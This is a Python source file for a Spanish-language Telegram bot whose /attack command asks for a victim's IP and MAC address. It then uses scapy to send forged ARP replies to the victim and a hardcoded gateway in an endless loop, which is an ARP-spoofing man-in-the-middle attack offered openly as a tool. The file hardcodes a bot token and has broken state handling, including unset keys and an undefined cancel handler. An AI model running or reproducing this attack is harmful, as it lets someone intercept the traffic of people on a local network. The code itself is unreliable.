import logging
import os
import threading
import time

from telegram import ReplyKeyboardMarkup
from telegram.ext import CommandHandler, ConversationHandler, MessageHandler, Updater
from scapy.all import ARP, Ether, send, srp

IP, MAC = range(2)

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)

logger = logging.getLogger(__name__)

def start(update, context):

    update.message.reply_text('Hola, usa /help para ver los comandos disponibles')


def help(update, context):

    update.message.reply_text('Los comandos disponibles son los siguientes:')
    update.message.reply_text('')
    update.message.reply_text('/start')
    update.message.reply_text('/help')
    update.message.reply_text('/attack')

def attack(update, context):

    reply_keyboard = [['/cancel']]
    update.message.reply_text(
        '¿Cuál es la dirección IP de su víctima?',
        reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True),
    )

    return IP
  
def mac_victima(update, context):

    context.user_data['mac_victima'] = update.message.text

    reply_keyboard = [['/cancel']]
    update.message.reply_text(
        '¿Cuál es la MAC de su víctima?',
        reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True),
    )

    return MAC


def ipattack(update, context):

    ip = update.message.text

    gateway_ip = "192.168.75.1"
    gateway_mac = "00:50:56:C0:00:08"
    
    target_ip = context.user_data['ip']
    target_mac = context.user_data['mac']
    
    print(target_ip)
    print(target_mac)

    arp = ARP(pdst=target_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=3, verbose=0)[0]

    for sent, received in result:
        target_mac = received.hwsrc

    while True:
      
        send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac))

        send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac))

        time.sleep(2)

    return ConversationHandler.END


def main():

    updater = Updater("6140799429:AAH3UwOcl4GlqqIy0oRKrTjbEfUAWWCicgU", use_context=True)

    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help))
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('attack', attack)],
        states={
            IP: [MessageHandler(None, mac_victima)],
            MAC: [MessageHandler(None, ipattack)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
        allow_reentry=True
    )
    dp.add_handler(conv_handler)
    updater.start_polling()

    updater.idle()

if __name__ == '__main__':
    main()
    
# By Sxmpl3.
